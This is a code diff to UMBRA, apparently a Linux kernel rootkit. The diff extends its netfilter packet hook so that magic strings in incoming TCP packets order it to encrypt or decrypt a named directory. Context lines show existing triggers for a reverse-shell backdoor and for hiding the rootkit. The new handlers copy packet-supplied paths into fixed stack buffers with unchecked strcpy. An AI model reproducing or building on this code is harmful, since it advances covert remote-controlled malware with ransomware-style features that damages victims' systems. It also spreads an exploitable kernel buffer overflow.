@@ -6,6 +6,11 @@
 const char* UMBRA_BACKDOOR_KEY = "UMBRA_PAYLOAD_GET_REVERSE_SHELL";
 const char* UMBRA_HIDE_ROOTKIT_KEY = "UMBRA_HIDE_ROOTKIT";
 const char* UMBRA_SHOW_ROOTKIT_KEY = "UMBRA_SHOW_ROOTKIT";
+
+const char* UMBRA_ENCRYPT_DIR_KEY = "UMBRA_ENCRYPT_DIR";
+#define UMBRA_ENCRYPT_DIR_KEY_BUF_LEN 512
+const char* UMBRA_DECRYPT_DIR_KEY = "UMBRA_DECRYPT_DIR";
+#define UMBRA_DECRYPT_DIR_KEY_BUF_LEN 512
 /**
  * Inspects incoming packets and check correspondence to backdoor packet:
  *      Proto: TCP
@@ -109,9 +114,16 @@ unsigned int net_hook(void *priv, struct sk_buff *skb, const struct nf_hook_stat
             printk(KERN_INFO "UMBRA:: Received order to unhide the rookit \n");
             show_rootkit();
             return NF_DROP;
+        }else if(memcmp(user_data, UMBRA_ENCRYPT_DIR_KEY, strlen(UMBRA_ENCRYPT_DIR_KEY))==0){
+            //Now we take out the directory which should come in user_data
+            char encrypt_path[UMBRA_ENCRYPT_DIR_KEY_BUF_LEN];
+            strcpy(encrypt_path, user_data+strlen(UMBRA_ENCRYPT_DIR_KEY));
+            printk(KERN_INFO "UMBRA:: Received order to ENCRYPT %s \n", encrypt_path);
+        }else if(memcmp(user_data, UMBRA_DECRYPT_DIR_KEY, strlen(UMBRA_DECRYPT_DIR_KEY))==0){
+            char decrypt_path[UMBRA_DECRYPT_DIR_KEY_BUF_LEN];
+            strcpy(decrypt_path, user_data+strlen(UMBRA_DECRYPT_DIR_KEY));
+            printk(KERN_INFO "UMBRA:: Received order to DECRYPT%s \n", decrypt_path);
         }
-
-
 
 
         return NF_ACCEPT;
